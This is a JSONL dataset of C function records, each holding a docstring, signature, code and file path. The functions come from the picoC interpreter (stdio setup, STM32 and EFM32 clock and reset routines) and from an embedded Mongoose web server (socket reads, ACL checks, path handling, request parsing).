{"docstring": "/* creates various system-dependent definitions */\n", "func_signal": "void StdioSetupFunc(Picoc *pc)", "code": "{\n    struct ValueType *StructFileType;\n    struct ValueType *FilePtrType;\n\n    /* make a \"struct __FILEStruct\" which is the same size as a native FILE structure */\n    StructFileType = TypeCreateOpaqueStruct(pc, NULL, TableStrRegister(pc, \"__FILEStruct\"), sizeof(FILE));\n    \n    /* get a FILE * type */\n    FilePtrType = TypeGetMatching(pc, NULL, StructFileType, TypePointer, 0, pc->StrEmpty, TRUE);\n\n    /* make a \"struct __va_listStruct\" which is the same size as our struct StdVararg */\n    TypeCreateOpaqueStruct(pc, NULL, TableStrRegister(pc, \"__va_listStruct\"), sizeof(FILE));\n    \n    /* define EOF equal to the system EOF */\n    VariableDefinePlatformVar(pc, NULL, \"EOF\", &pc->IntType, (union AnyValue *)&EOFValue, FALSE);\n    VariableDefinePlatformVar(pc, NULL, \"SEEK_SET\", &pc->IntType, (union AnyValue *)&SEEK_SETValue, FALSE);\n    VariableDefinePlatformVar(pc, NULL, \"SEEK_CUR\", &pc->IntType, (union AnyValue *)&SEEK_CURValue, FALSE);\n    VariableDefinePlatformVar(pc, NULL, \"SEEK_END\", &pc->IntType, (union AnyValue *)&SEEK_ENDValue, FALSE);\n    VariableDefinePlatformVar(pc, NULL, \"BUFSIZ\", &pc->IntType, (union AnyValue *)&BUFSIZValue, FALSE);\n    VariableDefinePlatformVar(pc, NULL, \"FILENAME_MAX\", &pc->IntType, (union AnyValue *)&FILENAME_MAXValue, FALSE);\n    VariableDefinePlatformVar(pc, NULL, \"_IOFBF\", &pc->IntType, (union AnyValue *)&_IOFBFValue, FALSE);\n    VariableDefinePlatformVar(pc, NULL, \"_IOLBF\", &pc->IntType, (union AnyValue *)&_IOLBFValue, FALSE);\n    VariableDefinePlatformVar(pc, NULL, \"_IONBF\", &pc->IntType, (union AnyValue *)&_IONBFValue, FALSE);\n    VariableDefinePlatformVar(pc, NULL, \"L_tmpnam\", &pc->IntType, (union AnyValue *)&L_tmpnamValue, FALSE);\n    VariableDefinePlatformVar(pc, NULL, \"GETS_MAX\", &pc->IntType, (union AnyValue *)&GETS_MAXValue, FALSE);\n    \n    /* define stdin, stdout and stderr */\n    VariableDefinePlatformVar(pc, NULL, \"stdin\", FilePtrType, (union AnyValue *)&stdinValue, FALSE);\n    VariableDefinePlatformVar(pc, NULL, \"stdout\", FilePtrType, (union AnyValue *)&stdoutValue, FALSE);\n    VariableDefinePlatformVar(pc, NULL, \"stderr\", FilePtrType, (union AnyValue *)&stderrValue, FALSE);\n\n    /* define NULL, TRUE and FALSE */\n    if (!VariableDefined(pc, TableStrRegister(pc, \"NULL\")))\n        VariableDefinePlatformVar(pc, NULL, \"NULL\", &pc->IntType, (union AnyValue *)&ZeroValue, FALSE);\n}", "path": "cstdlib\\stdio.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/* printf-style format of a pointer */\n", "func_signal": "void StdioFprintfPointer(StdOutStream *Stream, const char *Format, void *Value)", "code": "{\n    if (Stream->FilePtr != NULL)\n        Stream->CharCount += fprintf(Stream->FilePtr, Format, Value);\n    \n    else if (Stream->StrOutLen >= 0)\n    {\n#ifndef WIN32\n        int CCount = snprintf(Stream->StrOutPtr, Stream->StrOutLen, Format, Value);\n#else\n\t\tint CCount = _snprintf(Stream->StrOutPtr, Stream->StrOutLen, Format, Value);\n#endif\n\t\tStream->StrOutPtr += CCount;\n        Stream->StrOutLen -= CCount;\n        Stream->CharCount += CCount;\n    }\n    else\n    {\n        int CCount = sprintf(Stream->StrOutPtr, Format, Value);\n        Stream->CharCount += CCount;\n        Stream->StrOutPtr += CCount;\n    }\n}", "path": "cstdlib\\stdio.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/**\n  * @brief  Sets System clock frequency to 36MHz and configure HCLK, PCLK2 \n  *         and PCLK1 prescalers. \n  * @note   This function should be used only after reset.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "static void SetSysClockTo36(void)", "code": "{\n  __IO uint32_t StartUpCounter = 0, HSEStatus = 0;\n  \n  /* SYSCLK, HCLK, PCLK2 and PCLK1 configuration ---------------------------*/    \n  /* Enable HSE */    \n  RCC->CR |= ((uint32_t)RCC_CR_HSEON);\n \n  /* Wait till HSE is ready and if Time out is reached exit */\n  do\n  {\n    HSEStatus = RCC->CR & RCC_CR_HSERDY;\n    StartUpCounter++;  \n  } while((HSEStatus == 0) && (StartUpCounter != HSE_STARTUP_TIMEOUT));\n\n  if ((RCC->CR & RCC_CR_HSERDY) != RESET)\n  {\n    HSEStatus = (uint32_t)0x01;\n  }\n  else\n  {\n    HSEStatus = (uint32_t)0x00;\n  }  \n\n  if (HSEStatus == (uint32_t)0x01)\n  {\n    /* Enable Prefetch Buffer */\n    FLASH->ACR |= FLASH_ACR_PRFTBE;\n\n    /* Flash 1 wait state */\n    FLASH->ACR &= (uint32_t)((uint32_t)~FLASH_ACR_LATENCY);\n    FLASH->ACR |= (uint32_t)FLASH_ACR_LATENCY_1;    \n \n    /* HCLK = SYSCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_HPRE_DIV1;\n      \n    /* PCLK2 = HCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_PPRE2_DIV1;\n    \n    /* PCLK1 = HCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_PPRE1_DIV1;\n    \n#ifdef STM32F10X_CL\n    /* Configure PLLs ------------------------------------------------------*/\n    \n    /* PLL configuration: PLLCLK = PREDIV1 * 9 = 36 MHz */ \n    RCC->CFGR &= (uint32_t)~(RCC_CFGR_PLLXTPRE | RCC_CFGR_PLLSRC | RCC_CFGR_PLLMULL);\n    RCC->CFGR |= (uint32_t)(RCC_CFGR_PLLXTPRE_PREDIV1 | RCC_CFGR_PLLSRC_PREDIV1 | \n                            RCC_CFGR_PLLMULL9); \n\n\t/*!< PLL2 configuration: PLL2CLK = (HSE / 5) * 8 = 40 MHz */\n    /* PREDIV1 configuration: PREDIV1CLK = PLL2 / 10 = 4 MHz */\n        \n    RCC->CFGR2 &= (uint32_t)~(RCC_CFGR2_PREDIV2 | RCC_CFGR2_PLL2MUL |\n                              RCC_CFGR2_PREDIV1 | RCC_CFGR2_PREDIV1SRC);\n    RCC->CFGR2 |= (uint32_t)(RCC_CFGR2_PREDIV2_DIV5 | RCC_CFGR2_PLL2MUL8 |\n                             RCC_CFGR2_PREDIV1SRC_PLL2 | RCC_CFGR2_PREDIV1_DIV10);\n  \n    /* Enable PLL2 */\n    RCC->CR |= RCC_CR_PLL2ON;\n    /* Wait till PLL2 is ready */\n    while((RCC->CR & RCC_CR_PLL2RDY) == 0)\n    {\n    }\n    \n#else    \n    /*  PLL configuration: PLLCLK = (HSE / 2) * 9 = 36 MHz */\n    RCC->CFGR &= (uint32_t)((uint32_t)~(RCC_CFGR_PLLSRC | RCC_CFGR_PLLXTPRE | RCC_CFGR_PLLMULL));\n    RCC->CFGR |= (uint32_t)(RCC_CFGR_PLLSRC_HSE | RCC_CFGR_PLLXTPRE_HSE_Div2 | RCC_CFGR_PLLMULL9);\n#endif /* STM32F10X_CL */\n\n    /* Enable PLL */\n    RCC->CR |= RCC_CR_PLLON;\n\n    /* Wait till PLL is ready */\n    while((RCC->CR & RCC_CR_PLLRDY) == 0)\n    {\n    }\n\n    /* Select PLL as system clock source */\n    RCC->CFGR &= (uint32_t)((uint32_t)~(RCC_CFGR_SW));\n    RCC->CFGR |= (uint32_t)RCC_CFGR_SW_PLL;    \n\n    /* Wait till PLL is used as system clock source */\n    while ((RCC->CFGR & (uint32_t)RCC_CFGR_SWS) != (uint32_t)0x08)\n    {\n    }\n  }\n  else\n  { /* If HSE fails to start-up, the application will have wrong clock \n         configuration. User can add here some code to deal with this error */\n  } \n}", "path": "ports\\STM32\\system_stm32f10x.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/**\n  * @brief  Selects HSE as System clock source and configure HCLK, PCLK2\n  *         and PCLK1 prescalers.\n  * @note   This function should be used only after reset.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "static void SetSysClockToHSE(void)", "code": "{\n  __IO uint32_t StartUpCounter = 0, HSEStatus = 0;\n  \n  /* SYSCLK, HCLK, PCLK2 and PCLK1 configuration ---------------------------*/    \n  /* Enable HSE */    \n  RCC->CR |= ((uint32_t)RCC_CR_HSEON);\n \n  /* Wait till HSE is ready and if Time out is reached exit */\n  do\n  {\n    HSEStatus = RCC->CR & RCC_CR_HSERDY;\n    StartUpCounter++;  \n  } while((HSEStatus == 0) && (StartUpCounter != HSE_STARTUP_TIMEOUT));\n\n  if ((RCC->CR & RCC_CR_HSERDY) != RESET)\n  {\n    HSEStatus = (uint32_t)0x01;\n  }\n  else\n  {\n    HSEStatus = (uint32_t)0x00;\n  }  \n\n  if (HSEStatus == (uint32_t)0x01)\n  {\n\n#if !defined STM32F10X_LD_VL && !defined STM32F10X_MD_VL && !defined STM32F10X_HD_VL\n    /* Enable Prefetch Buffer */\n    FLASH->ACR |= FLASH_ACR_PRFTBE;\n\n    /* Flash 0 wait state */\n    FLASH->ACR &= (uint32_t)((uint32_t)~FLASH_ACR_LATENCY);\n\n#ifndef STM32F10X_CL\n    FLASH->ACR |= (uint32_t)FLASH_ACR_LATENCY_0;\n#else\n    if (HSE_VALUE <= 24000000)\n\t{\n      FLASH->ACR |= (uint32_t)FLASH_ACR_LATENCY_0;\n\t}\n\telse\n\t{\n      FLASH->ACR |= (uint32_t)FLASH_ACR_LATENCY_1;\n\t}\n#endif /* STM32F10X_CL */\n#endif\n \n    /* HCLK = SYSCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_HPRE_DIV1;\n      \n    /* PCLK2 = HCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_PPRE2_DIV1;\n    \n    /* PCLK1 = HCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_PPRE1_DIV1;\n    \n    /* Select HSE as system clock source */\n    RCC->CFGR &= (uint32_t)((uint32_t)~(RCC_CFGR_SW));\n    RCC->CFGR |= (uint32_t)RCC_CFGR_SW_HSE;    \n\n    /* Wait till HSE is used as system clock source */\n    while ((RCC->CFGR & (uint32_t)RCC_CFGR_SWS) != (uint32_t)0x04)\n    {\n    }\n  }\n  else\n  { /* If HSE fails to start-up, the application will have wrong clock \n         configuration. User can add here some code to deal with this error */\n  }  \n}", "path": "ports\\STM32\\system_stm32f10x.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "//    search for blob by color, index;  return center point X,Y and width Z\n", "func_signal": "void Cvblob(struct ParseState *Parser, struct Value *ReturnValue, struct Value **Param, int NumArgs)", "code": "{\n    int ix, iblob, numblob;\n\n    ix = Param[0]->Val->Integer;\n    if (ix > MAX_COLORS)\n        ProgramFail(NULL, \"blob():  invalid color index\");\n    iblob = Param[1]->Val->Integer;\n    if (iblob > MAX_BLOBS)\n        ProgramFail(NULL, \"blob():  invalid blob index\");\n        \n    numblob = vblob((unsigned char *)FRAME_BUF, (unsigned char *)FRAME_BUF3, ix);\n\n    if ((blobcnt[iblob] == 0) || (numblob == -1)) {\n        Blobcnt = 0;\n    } else {\n        Blobcnt = blobcnt[iblob];\n        Blobx1 = blobx1[iblob];\n        Blobx2 = blobx2[iblob];\n        Bloby1 = bloby1[iblob];\n        Bloby2 = bloby2[iblob];\n    }\n    ReturnValue->Val->Integer = numblob;\n}", "path": "platform\\library_surveyor.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/**\n * @brief\n *   Clear the reset cause register.\n ******************************************************************************/\n", "func_signal": "void RMU_ResetCauseClear(void)", "code": "{\n  uint32_t locked;\n\n  RMU->CMD = RMU_CMD_RCCLR;\n\n  /* Clear some reset causes not cleared with RMU CMD register */\n  /* (If EMU registers locked, they must be unlocked first) */\n  locked = EMU->LOCK & EMU_LOCK_LOCKKEY_LOCKED;\n  if (locked)\n  {\n    EMU_Unlock();\n  }\n\n  BITBAND_Peripheral(&(EMU->AUXCTRL), 0, 1);\n  BITBAND_Peripheral(&(EMU->AUXCTRL), 0, 0);\n\n  if (locked)\n  {\n    EMU_Lock();\n  }\n}", "path": "ports\\EFM32\\emlib\\src\\em_rmu.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/**\n  * @brief  Sets System clock frequency to 72MHz and configure HCLK, PCLK2 \n  *         and PCLK1 prescalers. \n  * @note   This function should be used only after reset.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "static void SetSysClockTo72(void)", "code": "{\n  __IO uint32_t StartUpCounter = 0, HSEStatus = 0;\n  \n  /* SYSCLK, HCLK, PCLK2 and PCLK1 configuration ---------------------------*/    \n  /* Enable HSE */    \n  RCC->CR |= ((uint32_t)RCC_CR_HSEON);\n \n  /* Wait till HSE is ready and if Time out is reached exit */\n  do\n  {\n    HSEStatus = RCC->CR & RCC_CR_HSERDY;\n    StartUpCounter++;  \n  } while((HSEStatus == 0) && (StartUpCounter != HSE_STARTUP_TIMEOUT));\n\n  if ((RCC->CR & RCC_CR_HSERDY) != RESET)\n  {\n    HSEStatus = (uint32_t)0x01;\n  }\n  else\n  {\n    HSEStatus = (uint32_t)0x00;\n  }  \n\n  if (HSEStatus == (uint32_t)0x01)\n  {\n    /* Enable Prefetch Buffer */\n    FLASH->ACR |= FLASH_ACR_PRFTBE;\n\n    /* Flash 2 wait state */\n    FLASH->ACR &= (uint32_t)((uint32_t)~FLASH_ACR_LATENCY);\n    FLASH->ACR |= (uint32_t)FLASH_ACR_LATENCY_2;    \n\n \n    /* HCLK = SYSCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_HPRE_DIV1;\n      \n    /* PCLK2 = HCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_PPRE2_DIV1;\n    \n    /* PCLK1 = HCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_PPRE1_DIV2;\n\n#ifdef STM32F10X_CL\n    /* Configure PLLs ------------------------------------------------------*/\n    /* PLL2 configuration: PLL2CLK = (HSE / 5) * 8 = 40 MHz */\n    /* PREDIV1 configuration: PREDIV1CLK = PLL2 / 5 = 8 MHz */\n        \n    RCC->CFGR2 &= (uint32_t)~(RCC_CFGR2_PREDIV2 | RCC_CFGR2_PLL2MUL |\n                              RCC_CFGR2_PREDIV1 | RCC_CFGR2_PREDIV1SRC);\n    RCC->CFGR2 |= (uint32_t)(RCC_CFGR2_PREDIV2_DIV5 | RCC_CFGR2_PLL2MUL8 |\n                             RCC_CFGR2_PREDIV1SRC_PLL2 | RCC_CFGR2_PREDIV1_DIV5);\n  \n    /* Enable PLL2 */\n    RCC->CR |= RCC_CR_PLL2ON;\n    /* Wait till PLL2 is ready */\n    while((RCC->CR & RCC_CR_PLL2RDY) == 0)\n    {\n    }\n    \n   \n    /* PLL configuration: PLLCLK = PREDIV1 * 9 = 72 MHz */ \n    RCC->CFGR &= (uint32_t)~(RCC_CFGR_PLLXTPRE | RCC_CFGR_PLLSRC | RCC_CFGR_PLLMULL);\n    RCC->CFGR |= (uint32_t)(RCC_CFGR_PLLXTPRE_PREDIV1 | RCC_CFGR_PLLSRC_PREDIV1 | \n                            RCC_CFGR_PLLMULL9); \n#else    \n    /*  PLL configuration: PLLCLK = HSE * 9 = 72 MHz */\n    RCC->CFGR &= (uint32_t)((uint32_t)~(RCC_CFGR_PLLSRC | RCC_CFGR_PLLXTPRE |\n                                        RCC_CFGR_PLLMULL));\n    RCC->CFGR |= (uint32_t)(RCC_CFGR_PLLSRC_HSE | RCC_CFGR_PLLMULL9);\n#endif /* STM32F10X_CL */\n\n    /* Enable PLL */\n    RCC->CR |= RCC_CR_PLLON;\n\n    /* Wait till PLL is ready */\n    while((RCC->CR & RCC_CR_PLLRDY) == 0)\n    {\n    }\n    \n    /* Select PLL as system clock source */\n    RCC->CFGR &= (uint32_t)((uint32_t)~(RCC_CFGR_SW));\n    RCC->CFGR |= (uint32_t)RCC_CFGR_SW_PLL;    \n\n    /* Wait till PLL is used as system clock source */\n    while ((RCC->CFGR & (uint32_t)RCC_CFGR_SWS) != (uint32_t)0x08)\n    {\n    }\n  }\n  else\n  { /* If HSE fails to start-up, the application will have wrong clock \n         configuration. User can add here some code to deal with this error */\n  }\n}", "path": "ports\\STM32\\system_stm32f10x.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/* creates various system-dependent definitions */\n", "func_signal": "void StringSetupFunc(Picoc *pc)", "code": "{\n    /* define NULL */\n    if (!VariableDefined(pc, TableStrRegister(pc, \"NULL\")))\n        VariableDefinePlatformVar(pc, NULL, \"NULL\", &pc->IntType, (union AnyValue *)&ZeroValue, FALSE);\n}", "path": "cstdlib\\string.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/**\n  * @brief  Sets System clock frequency to 48MHz and configure HCLK, PCLK2 \n  *         and PCLK1 prescalers. \n  * @note   This function should be used only after reset.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "static void SetSysClockTo48(void)", "code": "{\n  __IO uint32_t StartUpCounter = 0, HSEStatus = 0;\n  \n  /* SYSCLK, HCLK, PCLK2 and PCLK1 configuration ---------------------------*/    \n  /* Enable HSE */    \n  RCC->CR |= ((uint32_t)RCC_CR_HSEON);\n \n  /* Wait till HSE is ready and if Time out is reached exit */\n  do\n  {\n    HSEStatus = RCC->CR & RCC_CR_HSERDY;\n    StartUpCounter++;  \n  } while((HSEStatus == 0) && (StartUpCounter != HSE_STARTUP_TIMEOUT));\n\n  if ((RCC->CR & RCC_CR_HSERDY) != RESET)\n  {\n    HSEStatus = (uint32_t)0x01;\n  }\n  else\n  {\n    HSEStatus = (uint32_t)0x00;\n  }  \n\n  if (HSEStatus == (uint32_t)0x01)\n  {\n    /* Enable Prefetch Buffer */\n    FLASH->ACR |= FLASH_ACR_PRFTBE;\n\n    /* Flash 1 wait state */\n    FLASH->ACR &= (uint32_t)((uint32_t)~FLASH_ACR_LATENCY);\n    FLASH->ACR |= (uint32_t)FLASH_ACR_LATENCY_1;    \n \n    /* HCLK = SYSCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_HPRE_DIV1;\n      \n    /* PCLK2 = HCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_PPRE2_DIV1;\n    \n    /* PCLK1 = HCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_PPRE1_DIV2;\n    \n#ifdef STM32F10X_CL\n    /* Configure PLLs ------------------------------------------------------*/\n    /* PLL2 configuration: PLL2CLK = (HSE / 5) * 8 = 40 MHz */\n    /* PREDIV1 configuration: PREDIV1CLK = PLL2 / 5 = 8 MHz */\n        \n    RCC->CFGR2 &= (uint32_t)~(RCC_CFGR2_PREDIV2 | RCC_CFGR2_PLL2MUL |\n                              RCC_CFGR2_PREDIV1 | RCC_CFGR2_PREDIV1SRC);\n    RCC->CFGR2 |= (uint32_t)(RCC_CFGR2_PREDIV2_DIV5 | RCC_CFGR2_PLL2MUL8 |\n                             RCC_CFGR2_PREDIV1SRC_PLL2 | RCC_CFGR2_PREDIV1_DIV5);\n  \n    /* Enable PLL2 */\n    RCC->CR |= RCC_CR_PLL2ON;\n    /* Wait till PLL2 is ready */\n    while((RCC->CR & RCC_CR_PLL2RDY) == 0)\n    {\n    }\n    \n   \n    /* PLL configuration: PLLCLK = PREDIV1 * 6 = 48 MHz */ \n    RCC->CFGR &= (uint32_t)~(RCC_CFGR_PLLXTPRE | RCC_CFGR_PLLSRC | RCC_CFGR_PLLMULL);\n    RCC->CFGR |= (uint32_t)(RCC_CFGR_PLLXTPRE_PREDIV1 | RCC_CFGR_PLLSRC_PREDIV1 | \n                            RCC_CFGR_PLLMULL6); \n#else    \n    /*  PLL configuration: PLLCLK = HSE * 6 = 48 MHz */\n    RCC->CFGR &= (uint32_t)((uint32_t)~(RCC_CFGR_PLLSRC | RCC_CFGR_PLLXTPRE | RCC_CFGR_PLLMULL));\n    RCC->CFGR |= (uint32_t)(RCC_CFGR_PLLSRC_HSE | RCC_CFGR_PLLMULL6);\n#endif /* STM32F10X_CL */\n\n    /* Enable PLL */\n    RCC->CR |= RCC_CR_PLLON;\n\n    /* Wait till PLL is ready */\n    while((RCC->CR & RCC_CR_PLLRDY) == 0)\n    {\n    }\n\n    /* Select PLL as system clock source */\n    RCC->CFGR &= (uint32_t)((uint32_t)~(RCC_CFGR_SW));\n    RCC->CFGR |= (uint32_t)RCC_CFGR_SW_PLL;    \n\n    /* Wait till PLL is used as system clock source */\n    while ((RCC->CFGR & (uint32_t)RCC_CFGR_SWS) != (uint32_t)0x08)\n    {\n    }\n  }\n  else\n  { /* If HSE fails to start-up, the application will have wrong clock \n         configuration. User can add here some code to deal with this error */\n  } \n}", "path": "ports\\STM32\\system_stm32f10x.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "// This function is needed to prevent Mongoose to be stuck in a blocking\n// socket read when user requested exit. To do that, we sleep in select\n// with a timeout, and when returned, check the context for the stop flag.\n// If it is set, we return 0, and this means that we must not continue\n// reading, must give up and close the connection and exit serving thread.\n", "func_signal": "static int wait_until_socket_is_readable(struct mg_connection *conn)", "code": "{\n\tint result;\n\tstruct timeval tv;\n\tfd_set set;\n\n\tdo {\n\t\ttv.tv_sec = 0;\n\t\ttv.tv_usec = 300 * 1000;\n\t\tFD_ZERO(&set);\n\t\tFD_SET(conn->client.sock, &set);\n\t\tresult = select(conn->client.sock + 1, &set, NULL, NULL, &tv);\n\t\tif(result == 0 && conn->ssl != NULL) {\n\t\t\tresult = SSL_pending(conn->ssl);\n\t\t}\n\t} while ((result == 0 || (result < 0 && ERRNO == EINTR)) &&\n\t\t\tconn->ctx->stop_flag == 0);\n\n\treturn conn->ctx->stop_flag || result < 0 ? 0 : 1;\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// Verify given socket address against the ACL.\n// Return -1 if ACL is malformed, 0 if address is disallowed, 1 if allowed.\n", "func_signal": "static int check_acl(struct mg_context *ctx, uint32_t remote_ip)", "code": "{\n\tint allowed, flag;\n\tuint32_t net, mask;\n\tstruct vec vec;\n\tconst char *list = ctx->config[ACCESS_CONTROL_LIST];\n\n\t// If any ACL is set, deny by default\n\tallowed = list == NULL ? '+' : '-';\n\n\twhile ((list = next_option(list, &vec, NULL)) != NULL) {\n\t\tflag = vec.ptr[0];\n\t\tif ((flag != '+' && flag != '-') ||\n\t\t\t\tparse_net(&vec.ptr[1], &net, &mask) == 0) {\n\t\t\tcry(fc(ctx), \"%s: subnet must be [+|-]x.x.x.x[/x]\", __func__);\n\t\t\treturn -1;\n\t\t}\n\n\t\tif (net == (remote_ip & mask)) {\n\t\t\tallowed = flag;\n\t\t}\n\t}\n\n\treturn allowed == '+';\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// For Windows, change all slashes to backslashes in path names.\n", "func_signal": "static void change_slashes_to_backslashes(char *path)", "code": "{\n\tint i;\n\n\tfor (i = 0; path[i] != '\\0'; i++) {\n\t\tif (path[i] == '/')\n\t\t\tpath[i] = '\\\\';\n\t\t// i > 0 check is to preserve UNC paths, like \\\\server\\file.txt\n\t\tif (path[i] == '\\\\' && i > 0)\n\t\t\twhile (path[i + 1] == '\\\\' || path[i + 1] == '/')\n\t\t\t\t(void) memmove(path + i + 1,\n\t\t\t\t\t\tpath + i + 2, strlen(path + i + 1));\n\t}\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// Encode 'path' which is assumed UTF-8 string, into UNICODE string.\n// wbuf and wbuf_len is a target buffer and its length.\n", "func_signal": "static void to_unicode(const char *path, wchar_t *wbuf, size_t wbuf_len)", "code": "{\n\tchar buf[PATH_MAX], buf2[PATH_MAX], *p;\n\n\tmg_strlcpy(buf, path, sizeof(buf));\n\tchange_slashes_to_backslashes(buf);\n\n\t// Point p to the end of the file name\n\tp = buf + strlen(buf) - 1;\n\n\t// Trim trailing backslash character\n\twhile (p > buf && *p == '\\\\' && p[-1] != ':') {\n\t\t*p-- = '\\0';\n\t}\n\n\t// Protect from CGI code disclosure.\n\t// This is very nasty hole. Windows happily opens files with\n\t// some garbage in the end of file name. So fopen(\"a.cgi    \", \"r\")\n\t// actually opens \"a.cgi\", and does not return an error!\n\tif (*p == 0x20 ||               // No space at the end\n\t\t\t(*p == 0x2e && p > buf) ||  // No '.' but allow '.' as full path\n\t\t\t*p == 0x2b ||               // No '+'\n\t\t\t(*p & ~0x7f)) {             // And generally no non-ASCII chars\n\t\t(void) fprintf(stderr, \"Rejecting suspicious path: [%s]\", buf);\n\t\twbuf[0] = L'\\0';\n\t} else {\n\t\t// Convert to Unicode and back. If doubly-converted string does not\n\t\t// match the original, something is fishy, reject.\n\t\tmemset(wbuf, 0, wbuf_len * sizeof(wchar_t));\n\t\tMultiByteToWideChar(CP_UTF8, 0, buf, -1, wbuf, (int) wbuf_len);\n\t\tWideCharToMultiByte(CP_UTF8, 0, wbuf, (int) wbuf_len, buf2, sizeof(buf2),\n\t\t\t\tNULL, NULL);\n\t\tif (strcmp(buf, buf2) != 0) {\n\t\t\twbuf[0] = L'\\0';\n\t\t}\n\t}\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// !NO_POPEN\n", "func_signal": "static int mg_fgetc(struct file *filep, int offset)", "code": "{\n\tif (filep->membuf != NULL && offset >=0 && offset < filep->size) {\n\t\treturn ((unsigned char *) filep->membuf)[offset];\n\t} else if (filep->fp != NULL) {\n\t\treturn fgetc(filep->fp);\n\t} else {\n\t\treturn EOF;\n\t}\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// A helper function for traversing a comma separated list of values.\n// It returns a list pointer shifted to the next value, or NULL if the end\n// of the list found.\n// Value is stored in val vector. If value has form \"x=y\", then eq_val\n// vector is initialized to point to the \"y\" part, and val vector length\n// is adjusted to point only to \"x\".\n", "func_signal": "static const char *next_option(const char *list, struct vec *val,\n\t\tstruct vec *eq_val)", "code": "{\n\tif (list == NULL || *list == '\\0') {\n\t\t// End of the list\n\t\tlist = NULL;\n\t} else {\n\t\tval->ptr = list;\n\t\tif ((list = strchr(val->ptr, ',')) != NULL) {\n\t\t\t// Comma found. Store length and shift the list ptr\n\t\t\tval->len = list - val->ptr;\n\t\t\tlist++;\n\t\t} else {\n\t\t\t// This value is the last one\n\t\t\tlist = val->ptr + strlen(val->ptr);\n\t\t\tval->len = list - val->ptr;\n\t\t}\n\n\t\tif (eq_val != NULL) {\n\t\t\t// Value has form \"x=y\", adjust pointers and lengths\n\t\t\t// so that val points to \"x\", and eq_val points to \"y\".\n\t\t\teq_val->len = 0;\n\t\t\teq_val->ptr = (const char *) memchr(val->ptr, '=', val->len);\n\t\t\tif (eq_val->ptr != NULL) {\n\t\t\t\teq_val->ptr++;  // Skip over '=' character\n\t\t\t\teq_val->len = val->ptr + val->len - eq_val->ptr;\n\t\t\t\tval->len = (eq_val->ptr - val->ptr) - 1;\n\t\t\t}\n\t\t}\n\t}\n\n\treturn list;\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// Check whether full request is buffered. Return:\n//   -1  if request is malformed\n//    0  if request is not yet fully buffered\n//   >0  actual request length, including last \\r\\n\\r\\n\n", "func_signal": "static int get_request_len(const char *buf, int buflen)", "code": "{\n\tconst char *s, *e;\n\tint len = 0;\n\n\tfor (s = buf, e = s + buflen - 1; len <= 0 && s < e; s++)\n\t\t// Control characters are not allowed but >=128 is.\n\t\tif (!isprint(* (const unsigned char *) s) && *s != '\\r' &&\n\t\t\t\t*s != '\\n' && * (const unsigned char *) s < 128) {\n\t\t\tlen = -1;\n\t\t\tbreak; // [i_a] abort scan as soon as one malformed character is found; don't let subsequent \\r\\n\\r\\n win us over anyhow\n\t\t} else if (s[0] == '\\n' && s[1] == '\\n') {\n\t\t\tlen = (int) (s - buf) + 2;\n\t\t} else if (s[0] == '\\n' && &s[1] < e &&\n\t\t\t\ts[1] == '\\r' && s[2] == '\\n') {\n\t\t\tlen = (int) (s - buf) + 3;\n\t\t}\n\n\treturn len;\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
